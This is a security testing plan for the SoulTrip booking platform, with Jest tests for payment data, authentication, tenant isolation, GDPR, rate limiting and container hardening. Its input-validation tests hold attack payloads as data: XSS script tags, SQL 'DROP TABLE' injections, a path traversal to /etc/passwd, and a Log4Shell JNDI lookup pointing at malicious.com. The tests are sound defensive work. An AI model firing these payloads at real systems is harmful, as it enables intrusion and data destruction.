# Security Testing Framework for SoulTrip

## Overview

The SoulTrip platform handles sensitive user data, payment information, and multi-tenant access. This framework ensures comprehensive security validation across all platform components.

## Security Testing Scope

### Critical Security Areas
1. **Payment Data Security** (PCI DSS Level 1)
2. **User Authentication & Authorization**
3. **Multi-tenant Data Isolation**
4. **GDPR Compliance & Data Privacy**
5. **API Security & Rate Limiting**
6. **Input Validation & XSS Prevention**
7. **Infrastructure Security**

## PCI DSS Compliance Testing

### Payment Card Industry Data Security Standard Requirements

#### Requirement 1: Network Security Controls
```typescript
describe('Network Security', () => {
  it('should enforce HTTPS for all payment pages', async () => {
    const paymentPages = ['/booking/payment', '/organizer/billing']
    for (const page of paymentPages) {
      const response = await request.get(page)
      expect(response.headers['strict-transport-security']).toBeDefined()
      expect(response.request.protocol).toBe('https:')
    }
  })

  it('should validate SSL certificate configuration', async () => {
    const sslCheck = await checkSSLConfiguration('https://soultrip.com')
    expect(sslCheck.grade).toBe('A+')
    expect(sslCheck.protocols).not.toContain('TLSv1.0')
    expect(sslCheck.protocols).not.toContain('TLSv1.1')
  })
})
```

#### Requirement 3: Protect Stored Cardholder Data
```typescript
describe('Data Protection', () => {
  it('should never store sensitive authentication data', async () => {
    // Verify no PAN, CVV, or PIN data in database
    const sensitiveDataScan = await scanDatabase([
      /\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}/, // Credit card patterns
      /cvv|cvc|security.?code/i,
      /pin.?number/i
    ])
    expect(sensitiveDataScan.violations).toHaveLength(0)
  })

  it('should tokenize payment methods through Stripe', async () => {
    const paymentMethod = await createTestPaymentMethod()
    expect(paymentMethod.id).toMatch(/^pm_/)
    expect(paymentMethod).not.toHaveProperty('card.number')
  })
})
```

#### Requirement 6: Secure Development
```typescript
describe('Secure Development', () => {
  it('should validate all input parameters', async () => {
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '"; DROP TABLE users; --',
      '../../../etc/passwd',
      '${jndi:ldap://malicious.com/a}'
    ]

    for (const input of maliciousInputs) {
      const response = await request.post('/api/tours').send({
        title: input,
        description: input
      })
      expect(response.status).toBe(400)
      expect(response.body.error).toContain('Invalid input')
    }
  })
})
```

## Authentication & Authorization Testing

### Multi-Factor Authentication
```typescript
describe('Multi-Factor Authentication', () => {
  it('should require MFA for organizer accounts', async () => {
    // Test MFA setup
    const user = await createOrganizerAccount()
    const loginResponse = await attemptLogin(user.email, user.password)
    expect(loginResponse.requires_mfa).toBe(true)
    
    // Test MFA verification
    const mfaToken = generateTestMFAToken()
    const verifyResponse = await verifyMFA(user.id, mfaToken)
    expect(verifyResponse.access_token).toBeDefined()
  })

  it('should lock accounts after failed MFA attempts', async () => {
    const user = await createOrganizerAccount()
    
    // Attempt multiple failed MFA verifications
    for (let i = 0; i < 5; i++) {
      await verifyMFA(user.id, 'invalid-token')
    }
    
    const loginAttempt = await attemptLogin(user.email, user.password)
    expect(loginAttempt.account_locked).toBe(true)
  })
})
```

### Role-Based Access Control (RBAC)
```typescript
describe('Role-Based Access Control', () => {
  it('should enforce organizer-only access to tour management', async () => {
    const participant = await createParticipantAccount()
    const participantToken = await generateAuthToken(participant)
    
    const response = await request
      .post('/api/tours')
      .set('Authorization', `Bearer ${participantToken}`)
      .send(validTourData)
    
    expect(response.status).toBe(403)
    expect(response.body.error).toContain('Insufficient permissions')
  })

  it('should enforce tenant isolation for organizer data', async () => {
    const organizer1 = await createOrganizerAccount()
    const organizer2 = await createOrganizerAccount()
    
    // Organizer 1 creates a tour
    const tour = await createTour(organizer1.id)
    
    // Organizer 2 attempts to access Organizer 1's tour
    const token2 = await generateAuthToken(organizer2)
    const response = await request
      .get(`/api/tours/${tour.id}`)
      .set('Authorization', `Bearer ${token2}`)
    
    expect(response.status).toBe(404) // Should not exist for this organizer
  })
})
```

## GDPR Compliance Testing

### Data Subject Rights
```typescript
describe('GDPR Data Subject Rights', () => {
  it('should provide data export functionality', async () => {
    const user = await createUserAccount()
    const exportRequest = await request
      .post('/api/gdpr/export')
      .set('Authorization', `Bearer ${user.token}`)
    
    expect(exportRequest.status).toBe(200)
    expect(exportRequest.body.data).toContain(user.email)
    expect(exportRequest.body.data).toContain(user.profile)
    expect(exportRequest.body.booking_history).toBeDefined()
  })

  it('should handle data deletion requests', async () => {
    const user = await createUserAccount()
    const booking = await createBooking(user.id)
    
    // Request account deletion
    const deleteRequest = await request
      .post('/api/gdpr/delete')
      .set('Authorization', `Bearer ${user.token}`)
    
    expect(deleteRequest.status).toBe(200)
    
    // Verify data anonymization (not full deletion due to financial records)
    const userCheck = await getUserById(user.id)
    expect(userCheck.email).toBe('[DELETED]')
    expect(userCheck.name).toBe('[DELETED]')
    
    // Financial records should remain for compliance
    const bookingCheck = await getBookingById(booking.id)
    expect(bookingCheck.id).toBeDefined()
    expect(bookingCheck.user_id).toBe(user.id) // Anonymized reference
  })

  it('should obtain explicit consent for data processing', async () => {
    const registrationData = {
      email: 'test@example.com',
      marketing_consent: true,
      data_processing_consent: true,
      terms_accepted: true
    }
    
    const response = await request.post('/api/auth/register').send(registrationData)
    expect(response.status).toBe(201)
    
    // Verify consent is recorded
    const user = await getUserByEmail(registrationData.email)
    expect(user.consent_records).toHaveLength(3)
    expect(user.consent_records).toContainEqual(
      expect.objectContaining({
        type: 'marketing',
        granted: true,
        timestamp: expect.any(String)
      })
    )
  })
})
```

### Data Processing Lawfulness
```typescript
describe('Data Processing Lawfulness', () => {
  it('should only collect necessary data for service provision', async () => {
    const tourBookingData = {
      tour_id: 'tour_123',
      participant_name: 'John Doe',
      participant_email: 'john@example.com',
      emergency_contact: '+1234567890',
      dietary_requirements: 'Vegetarian'
    }
    
    const response = await request.post('/api/bookings').send(tourBookingData)
    expect(response.status).toBe(201)
    
    // Verify no additional data was collected without consent
    const booking = await getBookingById(response.body.id)
    expect(booking).not.toHaveProperty('ip_address')
    expect(booking).not.toHaveProperty('browser_fingerprint')
  })
})
```

## API Security Testing

### Rate Limiting
```typescript
describe('API Rate Limiting', () => {
  it('should enforce rate limits on authentication endpoints', async () => {
    const endpoint = '/api/auth/login'
    const requests = Array(100).fill(null).map(() => 
      request.post(endpoint).send({ email: 'test@example.com', password: 'wrong' })
    )
    
    const responses = await Promise.all(requests)
    const rateLimitedResponses = responses.filter(r => r.status === 429)
    expect(rateLimitedResponses.length).toBeGreaterThan(0)
  })

  it('should implement different rate limits for different user types', async () => {
    const participantToken = await generateAuthToken(participantUser)
    const organizerToken = await generateAuthToken(organizerUser)
    
    // Organizers should have higher rate limits for tour management
    const organizerRequests = Array(50).fill(null).map(() =>
      request.get('/api/tours').set('Authorization', `Bearer ${organizerToken}`)
    )
    
    const organizerResponses = await Promise.all(organizerRequests)
    const organizerRateLimited = organizerResponses.filter(r => r.status === 429)
    expect(organizerRateLimited.length).toBe(0)
  })
})
```

### Input Validation & Sanitization
```typescript
describe('Input Validation', () => {
  it('should prevent SQL injection attacks', async () => {
    const maliciousInput = "'; DROP TABLE tours; --"
    
    const response = await request.get(`/api/tours?search=${maliciousInput}`)
    expect(response.status).toBe(200) // Should not cause server error
    
    // Verify tables still exist
    const tourCount = await db.query('SELECT COUNT(*) FROM tours')
    expect(tourCount.rows[0].count).toBeGreaterThan(0)
  })

  it('should sanitize XSS attempts in user content', async () => {
    const xssPayload = '<script>alert("XSS")</script>'
    
    const response = await request
      .post('/api/tours')
      .set('Authorization', `Bearer ${organizerToken}`)
      .send({
        title: 'Test Tour',
        description: xssPayload
      })
    
    expect(response.status).toBe(201)
    
    const savedTour = await getTourById(response.body.id)
    expect(savedTour.description).not.toContain('<script>')
    expect(savedTour.description).toContain('&lt;script&gt;')
  })
})
```

## Infrastructure Security Testing

### Container Security
```typescript
describe('Container Security', () => {
  it('should run containers as non-root user', async () => {
    const containerInfo = await docker.inspectContainer('soultrip-app')
    expect(containerInfo.Config.User).not.toBe('root')
    expect(containerInfo.Config.User).not.toBe('0')
  })

  it('should not expose unnecessary ports', async () => {
    const containerInfo = await docker.inspectContainer('soultrip-app')
    const exposedPorts = Object.keys(containerInfo.Config.ExposedPorts || {})
    expect(exposedPorts).toEqual(['3000/tcp']) // Only application port
  })
})
```

### Environment Security
```typescript
describe('Environment Security', () => {
  it('should not expose sensitive environment variables', async () => {
    const response = await request.get('/api/health')
    expect(response.body).not.toHaveProperty('DATABASE_URL')
    expect(response.body).not.toHaveProperty('STRIPE_SECRET_KEY')
    expect(response.body).not.toHaveProperty('JWT_SECRET')
  })

  it('should use secure headers', async () => {
    const response = await request.get('/')
    expect(response.headers['x-frame-options']).toBe('DENY')
    expect(response.headers['x-content-type-options']).toBe('nosniff')
    expect(response.headers['x-xss-protection']).toBe('1; mode=block')
    expect(response.headers['content-security-policy']).toBeDefined()
  })
})
```

## Penetration Testing Schedule

### Automated Security Scanning
- **Daily**: Dependency vulnerability scanning
- **Weekly**: Static code analysis (SAST)
- **Monthly**: Dynamic application security testing (DAST)
- **Quarterly**: Infrastructure penetration testing

### Manual Security Testing
- **Pre-release**: Security code review for critical features
- **Quarterly**: Professional penetration testing
- **Annually**: Comprehensive security audit

## Security Incident Response Testing

### Incident Simulation
```typescript
describe('Security Incident Response', () => {
  it('should detect and respond to suspicious activity', async () => {
    // Simulate suspicious login pattern
    const suspiciousIPs = ['1.2.3.4', '5.6.7.8', '9.10.11.12']
    
    for (const ip of suspiciousIPs) {
      await simulateLoginAttempt(userAccount, { ip })
    }
    
    // Verify security alerts are triggered
    const alerts = await getSecurityAlerts(userAccount.id)
    expect(alerts).toContainEqual(
      expect.objectContaining({
        type: 'suspicious_login_pattern',
        user_id: userAccount.id
      })
    )
  })

  it('should automatically lock accounts under attack', async () => {
    const bruteForceAttempts = Array(20).fill(null).map(() =>
      attemptLogin(userAccount.email, 'wrong-password')
    )
    
    await Promise.all(bruteForceAttempts)
    
    const loginAttempt = await attemptLogin(userAccount.email, userAccount.password)
    expect(loginAttempt.account_locked).toBe(true)
  })
})
```

## Compliance Reporting

### Security Metrics Dashboard
- **Vulnerability Count**: Critical, High, Medium, Low
- **Patch Management**: Time to patch critical vulnerabilities
- **Access Control**: Failed authentication attempts, privilege escalations
- **Data Protection**: Encryption status, data retention compliance
- **Incident Response**: Mean time to detection/response

### Audit Trail Requirements
- All authentication events
- Administrative actions
- Data access and modifications
- Payment processing activities
- System configuration changes

This security testing framework ensures comprehensive protection of the SoulTrip platform and compliance with industry standards and regulations.